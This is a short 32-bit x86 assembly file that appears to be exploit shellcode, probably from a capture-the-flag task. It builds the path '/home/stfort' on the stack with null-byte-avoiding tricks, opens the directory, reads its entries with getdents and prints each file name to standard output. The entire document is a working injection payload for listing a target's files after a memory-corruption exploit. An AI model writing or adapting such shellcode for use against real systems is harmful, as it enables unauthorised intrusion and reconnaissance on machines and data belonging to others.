
BITS 32
SYS_open equ 5
SYS_write equ 4
SYS_getdents equ 141

    ; push '/home/stfort\x00' 
    push 1
    dec byte [esp]
    push 0x74726f66
    push 0x74732f65
    push 0x6d6f682f

    ; call open('esp', 0x90800) 
    push SYS_open ; 5 
    pop eax
    mov ebx, esp
    mov ecx, (-1) ^ 0x90800
    not ecx
    int 0x80

mov esi, eax
sub esp, 1024
    ; call getdents('esi', 'esp', 0x400) 
    xor eax, eax
    mov al, 0x8d
    mov ebx, esi
    mov ecx, esp
    xor edx, edx
    mov dh, 0x400 >> 8
    int 0x80

mov esi, eax ; esi := size 
mov edi, esp
add edi, esi ; edi := iteration_end 
mov esi, esp ; esi := iteration_start 
jmp check
loop:
add esi, 8 ; skip d_ino and d_off 
movzx edx, word [esi] ; edz := d_reclen 
sub edx, 11 ; subtract sizeof(d_ino) + sizeof(d_off) + sizeof(d_reclen) + sizeof(d_type)
add esi, 2 ; skip d_reclen  
    ; call write(1, 'esi', 'edx') 
    push SYS_write ; 4 
    pop eax
    push 1
    pop ebx
    mov ecx, esi
    int 0x80

add esi, edx ; fixup pointer 
inc esi
check:
cmp edi, esi
jg loop

